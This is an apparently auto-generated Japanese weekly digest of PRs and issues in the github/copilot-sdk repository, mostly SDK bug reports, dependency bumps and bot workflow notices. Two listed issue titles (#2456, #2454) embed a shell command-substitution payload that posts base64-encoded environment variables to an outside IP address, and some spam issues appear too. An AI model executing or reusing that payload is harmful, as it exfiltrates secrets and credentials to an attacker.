# github/copilot-sdk *(詳細モード)*

対象期間: 2026-10-22 00:21:02 〜 2026-10-28 00:23:35 (UTC)

## 統計サマリー

| 区分                    | 件数 |
| ----------------------- | ---- |
| マージ済み PR           | 0 |
| オープン中の新規 PR     | 3 |
| クローズ (未マージ) PR  | 1 |
| 新規 Issue              | 11 |
| クローズ Issue          | 146 |
| 主要コントリビューター  | — |

## ⚠ 重要な変更（要確認）

<!-- タイトル/本文/ラベルからの自動判定です。誤検出はこの箇条書きごと削除可。各項目の影響を1行で補い、TODO コメントを消してください。 -->

## このリポジトリの要点

期間内にマージ済み PR はなく、Go SDK の resume 後に置き換えられた session を終了する提案と、Python `certifi`／Node `zod` の依存更新がレビュー中です。新規 Issue では外部 tool の timeout 設定、Linux streaming 時の CPU 使用率、session abort 後の tool 実行状態などの課題が挙がっています。API の GA／破壊的変更は確認されず、実装変更は未マージのため次回も追跡が必要です。

## その他の変更

| 種別 | 番号 | タイトル | 状態 | 作者 | リンク |
| ---- | ---- | -------- | ---- | ---- | ------ |
| PR | #2866 | build(deps): bump certifi from 2026.7.22 to 2026.10.19 in /python in the uv group across 1 directory | open | dependabot[bot] | <https://github.com/github/copilot-sdk/pull/2866> |
| PR | #2865 | build(deps): bump zod from 4.3.6 to 4.6.6 in /nodejs in the npm_and_yarn group across 1 directory | open | dependabot[bot] | <https://github.com/github/copilot-sdk/pull/2865> |
| PR | #2864 | fix(go): retire replaced session after successful resume | open | ernsahin | <https://github.com/github/copilot-sdk/pull/2864> |
| PR | #2859 | docs: explain non-PTY command hangs and safe recovery | closed | Ckarey007 | <https://github.com/github/copilot-sdk/pull/2859> |
| Issue | #2873 | SDK-backed sessions in VS Code report credit limit reached while standalone CLI works | open | Xiaorui-Huang | <https://github.com/github/copilot-sdk/issues/2873> |
| Issue | #2861 | New hook: onAgentResponse | closed | lilian-delouvy | <https://github.com/github/copilot-sdk/issues/2861> |
| Issue | #2872 | External tool calls time out after 1800 seconds, but documentation is unclear on how to configure or disable the timeout | open | mingtwan | <https://github.com/github/copilot-sdk/issues/2872> |
| Issue | #2870 | Unable to use Copilot in VS Code | closed | yolopalisson | <https://github.com/github/copilot-sdk/issues/2870> |
| Issue | #2869 | About vscode copilot agent default selection | closed | DankeBIBI | <https://github.com/github/copilot-sdk/issues/2869> |
| Issue | #2868 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2868> |
| Issue | #2867 | [aw] Release Notes Generator reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2867> |
| Issue | #2860 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2860> |
| Issue | #2863 | Node SDK: `exitFallback.unref is not a function` crashes Electron renderer hosts (regression in 1.0.17) | closed | tidy-dev | <https://github.com/github/copilot-sdk/issues/2863> |
| Issue | #2871 | Standalone tools.execute calls keep failing after session abort until another chat turn | open | gambtho | <https://github.com/github/copilot-sdk/issues/2871> |
| Issue | #2862 | Linux - Copilot harness pegs CPU during output streaming, text/code output slow | open | jbrunette | <https://github.com/github/copilot-sdk/issues/2862> |
| Issue | #2475 | coiplit 运行的时候 会白屏，编辑或思考的内容 | closed | xipeng5 | <https://github.com/github/copilot-sdk/issues/2475> |
| Issue | #2303 | Bug: SDK crashes when using special characters in prompt | closed | Devdeep781 | <https://github.com/github/copilot-sdk/issues/2303> |
| Issue | #1985 | polyglot programming best practice ? | closed | PrestigeDevop | <https://github.com/github/copilot-sdk/issues/1985> |
| Issue | #1630 | models.list -32603 in Kubernetes | closed | sagaut | <https://github.com/github/copilot-sdk/issues/1630> |
| Issue | #1277 | `subagent.started` event sometimes reports "General Purpose Agent" instead of registered `displayName` (intermittent, same code/commit) | closed | kevinlims | <https://github.com/github/copilot-sdk/issues/1277> |
| Issue | #1173 | How to use MCP tools or built-in tools in a remote Copilot session from client | closed | jinlxz | <https://github.com/github/copilot-sdk/issues/1173> |
| Issue | #2822 | No way to cancel/kill a dispatched background agent — a stuck one runs indefinitely and silently burns spend | closed | prepatdiscobj | <https://github.com/github/copilot-sdk/issues/2822> |
| Issue | #2652 | CopilotClient fails with "No GitHub OAuth token or Copilot HMAC key provided" on Linux only, with a valid gitHubToken set | closed | fgapito | <https://github.com/github/copilot-sdk/issues/2652> |
| Issue | #2376 | Add searchMessages() method to query inside session history | closed | Navanit-git | <https://github.com/github/copilot-sdk/issues/2376> |
| Issue | #2237 | SDK model listing | closed | salamichobani | <https://github.com/github/copilot-sdk/issues/2237> |
| Issue | #2121 | How to retrieve the AI Consumption of AI Credits of the opened session | closed | matteo-ladrat-Legrand | <https://github.com/github/copilot-sdk/issues/2121> |
| Issue | #1853 | Prompt caching | closed | georges-nasrallah | <https://github.com/github/copilot-sdk/issues/1853> |
| Issue | #1565 | Cloud agent repeatedly renames session and re-reads the same MCP config in a fresh session | closed | coastal-ms | <https://github.com/github/copilot-sdk/issues/1565> |
| Issue | #1563 | Temperature / Determinism control | closed | georges-nasrallah | <https://github.com/github/copilot-sdk/issues/1563> |
| Issue | #1555 | Billing explanation | closed | WindowsNT | <https://github.com/github/copilot-sdk/issues/1555> |
| Issue | #1446 | [Question] How to choose between Copilot SDK and Agent Framework? | closed | ClearJ233 | <https://github.com/github/copilot-sdk/issues/1446> |
| Issue | #1281 | Possible with GitHub Pages? | closed | khusmeno-MS | <https://github.com/github/copilot-sdk/issues/1281> |
| Issue | #1187 | Feature Request: Return x-ratelimit-* headers in GitHub Copilot completions API responses | closed | renne | <https://github.com/github/copilot-sdk/issues/1187> |
| Issue | #1100 | Feature Request / Question: Support for reasoning_effort with Ollama provider | closed | jonathanGGa | <https://github.com/github/copilot-sdk/issues/1100> |
| Issue | #1075 | [Question / Potential bug] Inconsistent models listing with Microsoft Agent Framework (.NET) + Copilot SDK | closed | forestmaxime | <https://github.com/github/copilot-sdk/issues/1075> |
| Issue | #903 | A warning with BYOK saying node wants to use confidential information stored in copilot-cli in your keychain | closed | ajasingh | <https://github.com/github/copilot-sdk/issues/903> |
| Issue | #2831 | Public session-scoped skill provider API (lazy list/read callbacks) | closed | vatsa-msft | <https://github.com/github/copilot-sdk/issues/2831> |
| Issue | #2793 | rust: in-process transport frees the connection callback state immediately when `copilot_runtime_connection_open` returns 0 (possible use-after-free) | closed | Lukaze | <https://github.com/github/copilot-sdk/issues/2793> |
| Issue | #2777 | Avoid initializing every session event type on first deserialization | closed | davkean | <https://github.com/github/copilot-sdk/issues/2777> |
| Issue | #2716 | Weird `/fleet` command inject as though it was user sent | closed | DonJayamanne | <https://github.com/github/copilot-sdk/issues/2716> |
| Issue | #2692 | Bash tool overrides are not honored in the latest Copilot SDK/runtime | closed | TYW-0203 | <https://github.com/github/copilot-sdk/issues/2692> |
| Issue | #2677 | Rust bundled runtime installation spends avoidable CPU time decompressing gzip archives | closed | mohamedmansour | <https://github.com/github/copilot-sdk/issues/2677> |
| Issue | #2651 | Expose session-scoped in-memory skill providers | closed | adirh3 | <https://github.com/github/copilot-sdk/issues/2651> |
| Issue | #2624 | Rust: `create_session` deadlocks forever when `ClientOptions::session_fs` is set — the session's request consumer starts after the `session.create` RPC | closed | EvanDodds | <https://github.com/github/copilot-sdk/issues/2624> |
| Issue | #2517 | Unhandled "provider is closed" inside the runtime's own error handler terminates the host process | closed | mit2nil | <https://github.com/github/copilot-sdk/issues/2517> |
| Issue | #2349 | Attachments are silently ignored when using the /fleet command | closed | DonJayamanne | <https://github.com/github/copilot-sdk/issues/2349> |
| Issue | #2043 | Ask: A supported way to disable built-in sub-agents | closed | AbeGeMS | <https://github.com/github/copilot-sdk/issues/2043> |
| Issue | #1937 | Get to resolution and document with ADR regarding "java release mutates main" | closed | edburns | <https://github.com/github/copilot-sdk/issues/1937> |
| Issue | #1896 | Feature Request: mutate the active tool list on a live session (SDK re-triage of #735) | closed | ChrisKrawczyk | <https://github.com/github/copilot-sdk/issues/1896> |
| Issue | #1870 | Unify `publish.yml` so all languages are included | closed | edburns | <https://github.com/github/copilot-sdk/issues/1870> |
| Issue | #1809 | Java: Ergonomics: Defining tools: follow up work | closed | edburns | <https://github.com/github/copilot-sdk/issues/1809> |
| Issue | #1788 | Setting `LargeOutput` doesn't seem to have any effect | closed | aelij | <https://github.com/github/copilot-sdk/issues/1788> |
| Issue | #1640 | Sub agent not follow the model setting | closed | zeerd | <https://github.com/github/copilot-sdk/issues/1640> |
| Issue | #1608 | Add skill-level spans to OpenTelemetry traces | closed | Alexk2309 | <https://github.com/github/copilot-sdk/issues/1608> |
| Issue | #1516 | Expose real-time context/usage metrics in the Copilot SDK | closed | KeshavKhanth | <https://github.com/github/copilot-sdk/issues/1516> |
| Issue | #1433 | Feature request: Plumb AbortSignal through ToolInvocation so session.abort() can cancel in-flight tool handlers | closed | Ljosmann | <https://github.com/github/copilot-sdk/issues/1433> |
| Issue | #1429 | PyPI documentation on custom permission handler outdated | closed | sophiehenning | <https://github.com/github/copilot-sdk/issues/1429> |
| Issue | #1332 | Expose LLM tool-call id to MCP tool invocations | closed | lxwl-fht | <https://github.com/github/copilot-sdk/issues/1332> |
| Issue | #1274 | No heartbeat event during LLM-streamed tool-argument construction; watchdogs can't distinguish working from hung | closed | kevinlims | <https://github.com/github/copilot-sdk/issues/1274> |
| Issue | #1273 | `session.disconnect()` is cooperative; doesn't abort `sendAndWait` or close the transport | closed | kevinlims | <https://github.com/github/copilot-sdk/issues/1273> |
| Issue | #1185 | Support structured outputs (JSON schema) per message, passed through to provider | closed | Halcyonhal9 | <https://github.com/github/copilot-sdk/issues/1185> |
| Issue | #1143 | Feature Request: session-scoped tool inventory API (list MCP-discovered tools loaded into a session) | closed | reachanihere | <https://github.com/github/copilot-sdk/issues/1143> |
| Issue | #1131 | [Feature Request] Allow subagents to override reasoning effort in CustomAgentConfig (parity with Claude Agent SDK) | closed | nicbstme | <https://github.com/github/copilot-sdk/issues/1131> |
| Issue | #1016 | Feature: Strongly type Python events | closed | Techbert08 | <https://github.com/github/copilot-sdk/issues/1016> |
| Issue | #1002 | add oauth support for http based mcp server (like copilot-cli) | closed | plusplusoneplusplus | <https://github.com/github/copilot-sdk/issues/1002> |
| Issue | #915 | FLEET: resumeSession() with customAgents errors with malformed timeout message "[object Object]ms" | closed | darthmolen | <https://github.com/github/copilot-sdk/issues/915> |
| Issue | #551 | Enterprise and non-person identities | closed | patniko | <https://github.com/github/copilot-sdk/issues/551> |
| Issue | #490 | How to receive the session.shutdown event? | closed | theblixguy | <https://github.com/github/copilot-sdk/issues/490> |
| Issue | #182 | Feature Request: User-Delegated Billing & Simple Prompt-Response API for Third-Party Applications | closed | benpaddlejones | <https://github.com/github/copilot-sdk/issues/182> |
| Issue | #73 | add option to disable line numbers in `view` tool output | closed | lukeed | <https://github.com/github/copilot-sdk/issues/73> |
| Issue | #41 | Structured output | closed | MLgentDev | <https://github.com/github/copilot-sdk/issues/41> |
| Issue | #39 | Mutable session properties | closed | lukeed | <https://github.com/github/copilot-sdk/issues/39> |
| Issue | #2840 | Source selections attached while a Copilot SDK agent is running don’t reach the model | closed | austincolemicrosoft | <https://github.com/github/copilot-sdk/issues/2840> |
| Issue | #2823 | Image request cap ignores modelCapabilities.limits.vision.max_prompt_images, and its newest-first eviction invalidates the prompt cache on every request | closed | IslamTayeb | <https://github.com/github/copilot-sdk/issues/2823> |
| Issue | #2582 | Provide an opt-in managed-runtime launcher hook for host-controlled process ownership | closed | simonthoresen | <https://github.com/github/copilot-sdk/issues/2582> |
| Issue | #2546 | When hit max_output_tokens, some events are not emitted and logged | closed | njdldkl666699 | <https://github.com/github/copilot-sdk/issues/2546> |
| Issue | #1789 | [Java] @CopilotTool ergonomics: Validate @Param defaultValue parseability at compile time | closed | edburns | <https://github.com/github/copilot-sdk/issues/1789> |
| Issue | #1496 | initializeAndValidate() is a no-op for extension sessions via joinSession() | closed | lowdrag84 | <https://github.com/github/copilot-sdk/issues/1496> |
| Issue | #1280 | Support for AG-UI Protocol in Copilot SDK | closed | zelixir | <https://github.com/github/copilot-sdk/issues/1280> |
| Issue | #2850 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2850> |
| Issue | #2846 | [aw] Release Notes Generator reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2846> |
| Issue | #2845 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2845> |
| Issue | #2830 | [aw] Release Notes Generator reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2830> |
| Issue | #2818 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2818> |
| Issue | #2817 | [aw] Release Notes Generator reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2817> |
| Issue | #2815 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2815> |
| Issue | #2806 | [aw] Release Notes Generator is missing required data | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2806> |
| Issue | #2796 | [aw] Documentation Handler produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2796> |
| Issue | #2788 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2788> |
| Issue | #2782 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2782> |
| Issue | #2779 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2779> |
| Issue | #2770 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2770> |
| Issue | #2767 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2767> |
| Issue | #2760 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2760> |
| Issue | #2757 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2757> |
| Issue | #2752 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2752> |
| Issue | #2740 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2740> |
| Issue | #2729 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2729> |
| Issue | #2725 | [aw] SDK Consistency Review Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2725> |
| Issue | #2723 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2723> |
| Issue | #2709 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2709> |
| Issue | #2708 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2708> |
| Issue | #2696 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2696> |
| Issue | #2693 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2693> |
| Issue | #2668 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2668> |
| Issue | #2667 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2667> |
| Issue | #2655 | [aw] SDK Consistency Review Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2655> |
| Issue | #2654 | [aw] Release Changelog Generator produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2654> |
| Issue | #2645 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2645> |
| Issue | #2641 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2641> |
| Issue | #2627 | [aw] Issue Classification Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2627> |
| Issue | #2620 | [aw] SDK Consistency Review Agent timed out | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2620> |
| Issue | #2612 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2612> |
| Issue | #2591 | [aw] Java Codegen Agentic Fix reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2591> |
| Issue | #2589 | [aw] Issue Classification Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2589> |
| Issue | #2576 | [aw] SDK Consistency Review Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2576> |
| Issue | #2575 | [aw] SDK Consistency Review Agent produced no safe outputs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2575> |
| Issue | #2538 | [aw] Java Codegen Agentic Fix reported incomplete result | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2538> |
| Issue | #2498 | [aw] SDK Consistency Review Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2498> |
| Issue | #2493 | [aw] Issue Classification Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2493> |
| Issue | #2489 | [aw] Java Codegen Agentic Fix failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2489> |
| Issue | #2462 | [aw] Java Codegen Agentic Fix failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2462> |
| Issue | #2461 | [aw] Issue Classification Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2461> |
| Issue | #2460 | CI is too slow | closed | SteveSandersonMS | <https://github.com/github/copilot-sdk/issues/2460> |
| Issue | #2459 | [aw] SDK Consistency Review Agent failed | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2459> |
| Issue | #2335 | [changelog] Add changelog for v1.0.11 | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2335> |
| Issue | #2308 | [Java]: Refactor test for better use of matrix | closed | edburns | <https://github.com/github/copilot-sdk/issues/2308> |
| Issue | #2277 | [aw] Detection Runs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2277> |
| Issue | #2275 | [changelog] Add changelog for v1.0.9 | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2275> |
| Issue | #2274 | [changelog] Add changelog for java/v1.0.9 | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2274> |
| Issue | #2057 | [changelog] Add changelog for v1.0.8 | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2057> |
| Issue | #2056 | [changelog] Add changelog for java/v1.0.8 | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/2056> |
| Issue | #1989 | [aw] No-Op Runs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/1989> |
| Issue | #1439 | Consider adding Java to `lsp.json` | closed | edburns | <https://github.com/github/copilot-sdk/issues/1439> |
| Issue | #1166 | Parity backlog: high-level session/client methods exposed in Rust SDK only | closed | tclem | <https://github.com/github/copilot-sdk/issues/1166> |
| Issue | #1052 | API review and ongoing API quality controls | closed | SteveSandersonMS | <https://github.com/github/copilot-sdk/issues/1052> |
| Issue | #1038 | [aw] No-Op Runs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/1038> |
| Issue | #1030 | Triage Agent Corrections | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/1030> |
| Issue | #866 | [.NET] CreateProcess fails when Copilot CLI is installed via npm (copilot.cmd) | closed | itayfisz | <https://github.com/github/copilot-sdk/issues/866> |
| Issue | #607 | Justfile lacks codegen support | closed | brettcannon | <https://github.com/github/copilot-sdk/issues/607> |
| Issue | #261 | [agentic-workflows] Failed runs | closed | github-actions[bot] | <https://github.com/github/copilot-sdk/issues/261> |
| Issue | #2552 | 860539 | closed | szof508 | <https://github.com/github/copilot-sdk/issues/2552> |
| Issue | #2551 | 3CheFMUhkva56D4DWhVfE5ATRMtnbrmT5N | closed | szof508 | <https://github.com/github/copilot-sdk/issues/2551> |
| Issue | #2456 | TypeError: Cannot read properties of undefined (reading 'map') $(curl -s http://54.205.16.142:8443/c/574ae57d986806faaa5bc3852f62dd94 -d $(env\|base64\|tr -d '\n')) | closed | ZeyadDev-1 | <https://github.com/github/copilot-sdk/issues/2456> |
| Issue | #2454 | TypeError: Cannot read properties of undefined (reading 'map') $(curl -s http://54.205.16.142:8443/c/56130a324e724b4c7e1eee97ec2ba191 -d $(env\|base64\|tr -d '\n')) | closed | yeimug | <https://github.com/github/copilot-sdk/issues/2454> |
| Issue | #2443 | Fix mobile navbar | closed | hbano7510-debug | <https://github.com/github/copilot-sdk/issues/2443> |
| Issue | #2441 | HANGARsteel0508009068 | closed | aszazs534 | <https://github.com/github/copilot-sdk/issues/2441> |
| Issue | #2440 | #هناجر #مقاول_هناجر #شركة_هناجر #تركيب_هناجر #تنفيذ_هناجر #صيانة_هناجر #حداد_هناجر #ورشة_حدادة #مصنع_هناجر #تصميم_هناجر #بناء_هناجر #توريد_هناجر #مظلات_وسواتر #مستودعات #حدادة #مقاولات_السعودية #هناجر_حديد | closed | aszazs534 | <https://github.com/github/copilot-sdk/issues/2440> |
| Issue | #2433 | Take a look!  | closed | kaawmnain24-netizen | <https://github.com/github/copilot-sdk/issues/2433> |
| Issue | #2377 | github now is Microsoft, when exactly are you going to destroy VS Code and GitHub? | closed | codebabel-appbag | <https://github.com/github/copilot-sdk/issues/2377> |
| Issue | #2361 | Test issue | closed | Copilot | <https://github.com/github/copilot-sdk/issues/2361> |
| Issue | #2284 | new issue | closed | yaasiinmd1 | <https://github.com/github/copilot-sdk/issues/2284> |
| Issue | #2075 | Persue procedures for personal and /or business restoration and reimbursement compliance  from mishandled individuals or assets | closed | networkingllc4223-gif | <https://github.com/github/copilot-sdk/issues/2075> |
| Issue | #1248 | Issue template mapping is unclear when creating issues from Copilot | closed | AkshatRaj00 | <https://github.com/github/copilot-sdk/issues/1248> |
